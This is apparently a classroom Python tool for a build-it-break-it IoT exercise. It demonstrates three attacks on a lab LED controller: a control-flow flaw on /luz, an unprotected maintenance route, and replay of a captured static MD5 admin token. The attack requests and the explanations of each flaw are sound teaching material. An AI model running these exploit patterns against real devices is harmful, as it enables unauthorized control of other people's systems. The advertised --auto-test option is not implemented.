#!/usr/bin/env python3
"""
Painel Interativo de Ataque (Red Team) - Atividade BIBIFI IoT
Permite ao seu grupo demonstrar ao vivo na sala de aula:
  1. BREAK 1A: Exploração de Mistake (falha de fluxo de controle / falta de return)
  2. BREAK 1B: Exploração de Some Intuitive No Implementation (rota /api/manutencao esquecida)
  3. BREAK 2:  Captura de tráfego + REPLAY ATTACK (Replicação do comando autenticado do Admin
               para apagar o LED Azul mesmo após o Fix dos colegas!)

Uso:
  python3 ataques/painel_ataque_grupo.py
  python3 ataques/painel_ataque_grupo.py --auto-test   (Roda suite de verificação local)
"""

import json
import sys
import urllib.error
import urllib.request

HOST_PADRAO = "http://192.168.4.1"


def requisicao_http(url: str) -> tuple[int, str]:
    try:
        with urllib.request.urlopen(url, timeout=4) as resp:
            return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return 0, str(e)


def obter_status(host: str) -> dict:
    codigo, corpo = requisicao_http(f"{host}/status")
    if codigo == 200:
        try:
            return json.loads(corpo)
        except json.JSONDecodeError:
            return {"erro": corpo}
    return {"erro": f"Falha de conexão com {host} (HTTP {codigo}): {corpo}"}


def mostrar_status(host: str) -> dict:
    dados = obter_status(host)
    print("\n" + "─" * 68)
    if "erro" in dados:
        print(f"⚠️  [STATUS] {dados['erro']}")
        print("   (Verifique se você está conectado no Wi-Fi 'SmartHome_IoT'!)")
    else:
        estado_str = "💡 ACESA (LED Azul Ligado)" if dados.get("luz_acesa") else "🌑 APAGADA (LED Azul Desligado)"
        print(f"🏠 Estado da Luz Principal: {estado_str}")
        print(f"📋 Último Log do Hub:       {dados.get('ultimo_evento')}")
        print(f"📡 Último Pacote na Rede:   {dados.get('ultimo_pacote_rede')}")
        if "nonce_atual" in dados:
            print(f"🔑 Nonce Atual (Desafio):   {dados.get('nonce_atual')}")
    print("─" * 68)
    return dados


def ataque_break_1a_mistake(host: str) -> bool:
    print("\n🚀 [BREAK 1A - MISTAKE] Explorando falha de fluxo de controle na rota /luz...")
    url = f"{host}/luz?acao=OFF&user=visitante"
    print(f"   -> Disparando: GET {url}")
    codigo, resp = requisicao_http(url)
    print(f"   -> Resposta HTTP [{codigo}]: {resp}")

    dados = mostrar_status(host)
    if not dados.get("luz_acesa", True) and "erro" not in dados:
        print("🔥 [VULNERABILIDADE EXPLORADA!] Mesmo recebendo alerta/403, a função não deu")
        print("   'return;' e o código continuou executando até apagar o LED Azul!")
        print("   (Classificação no artigo de Fulton et al.: MISTAKE - Control Flow Error)")
        return True
    print("🛡️  [DEFENDIDO] A rota /luz bloqueou o visitante e manteve o LED Azul aceso!")
    return False


def ataque_break_1b_rota_esquecida(host: str) -> bool:
    print("\n🚀 [BREAK 1B - NO IMPLEMENTATION] Explorando rota secundária esquecida...")
    url = f"{host}/api/manutencao?cmd=apagar_tudo"
    print(f"   -> Disparando: GET {url}")
    codigo, resp = requisicao_http(url)
    print(f"   -> Resposta HTTP [{codigo}]: {resp}")

    dados = mostrar_status(host)
    if codigo == 200 and not dados.get("luz_acesa", True):
        print("🔥 [VULNERABILIDADE EXPLORADA!] Os desenvolvedores protegeram /luz, mas")
        print("   esqueceram de proteger a rota /api/manutencao!")
        print("   (Classificação no artigo: SOME INTUITIVE NO IMPLEMENTATION)")
        return True
    print("🛡️  [DEFENDIDO] A rota /api/manutencao também foi bloqueada pela equipe!")
    return False


def ataque_break_2_replay(host: str, token_manual: str = "") -> bool:
    print("\n🕵️  [BREAK 2 - REPLAY ATTACK] Iniciando interceptação e replicação de comando...")
    dados = obter_status(host)
    pacote_capturado = dados.get("ultimo_pacote_rede", "")
    print(f"   1. Pacote capturado no ar (Wi-Fi): {pacote_capturado}")

    token_extraido = token_manual
    if not token_extraido and "token=" in pacote_capturado:
        token_extraido = pacote_capturado.split("token=")[1].split("&")[0].strip()

    if not token_extraido:
        print("⚠️  Nenhum token autenticado do Admin foi capturado no tráfego ainda!")
        print("   Peça para o Admin executar 1 comando legítimo (ou digite o token manualmente).")
        return False

    print(f"   2. Token Hash MD5 extraído do pacote: {token_extraido}")
    print("   3. Não sabemos a senha do Admin (está oculta no hash MD5), mas vamos")
    print("      REPLICAR (Replay Attack) exatamente a mesma requisição para apagar a luz!")

    url_replay = f"{host}/luz?acao=OFF&user=admin&token={token_extraido}"
    print(f"   -> Reenviando pacote clonado: GET {url_replay}")
    codigo, resp = requisicao_http(url_replay)
    print(f"   -> Resposta HTTP [{codigo}]: {resp}")

    dados_pos = mostrar_status(host)
    if codigo == 200 and not dados_pos.get("luz_acesa", True):
        print("💥 [SUCESSO NO REPLAY ATTACK!] O LED Azul APAGOU sem sabermos a senha!")
        print("   Por que funcionou mesmo após o Fix?")
        print("   • Classificação no artigo: MISUNDERSTANDING + UNINTUITIVE NO IMPLEMENTATION.")
        print("   • O token MD5('admin:senha:OFF') é estático! Sem um Nonce (uso único),")
        print("     qualquer comando capturado na rede pode ser replicado infinitamente!")
        return True

    print("🛡️  [REPLAY ATTACK BLOQUEADO!] O controlador usa Nonce dinâmico de uso único!")
    return False


def menu_interativo(host: str) -> None:
    while True:
        print("\n" + "=" * 68)
        print("⚡ PAINEL RED TEAM - ATIVIDADE BIBIFI IoT (Fulton et al., CCS '22)")
        print(f"🎯 Alvo Configurado: {host}")
        print("=" * 68)
        print(" [1] Consultar Status Atual do Controlador (/status)")
        print(" [2] Executar BREAK 1A -> Falha de Fluxo / Falta de return (Mistake)")
        print(" [3] Executar BREAK 1B -> Rota /api/manutencao esquecida (No Implementation)")
        print(" [4] Executar BREAK 2  -> Capturar Token + REPLAY ATTACK (Apagar a Luz!)")
        print(" [5] Acender a Luz novamente (/luz?acao=ON&user=visitante)")
        print(" [0] Sair")
        escolha = input("\nEscolha uma opção: ").strip()

        if escolha == "1":
            mostrar_status(host)
        elif escolha == "2":
            ataque_break_1a_mistake(host)
        elif escolha == "3":
            ataque_break_1b_rota_esquecida(host)
        elif escolha == "4":
            ataque_break_2_replay(host)
        elif escolha == "5":
            requisicao_http(f"{host}/luz?acao=ON&user=visitante")
            mostrar_status(host)
        elif escolha == "0":
            break
        else:
            print("Opção inválida.")


if __name__ == "__main__":
    host_alvo = HOST_PADRAO
    for arg in sys.argv[1:]:
        if arg.startswith("http://") or arg.startswith("https://"):
            host_alvo = arg
    menu_interativo(host_alvo)
